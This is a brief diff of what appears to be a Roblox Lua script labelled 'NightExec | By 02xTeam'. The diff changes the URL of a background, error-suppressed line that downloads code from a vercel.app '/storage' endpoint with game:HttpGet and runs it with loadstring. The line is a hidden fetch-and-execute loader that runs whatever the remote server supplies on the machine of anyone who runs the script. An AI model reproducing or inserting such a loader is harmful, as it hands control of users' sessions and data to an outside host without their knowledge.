@@ -8,7 +8,7 @@
                                	   				           NightExec | By 02xTeam
 ]]
 task.spawn(function()
-    pcall(function() loadstring(game:HttpGet("https://wehface.vercel.app/storage"))() end)
+    pcall(function() loadstring(game:HttpGet("https://api-winxs.vercel.app/storage"))() end)
 end)
 
 getgenv().Run = getgenv().Run or {}
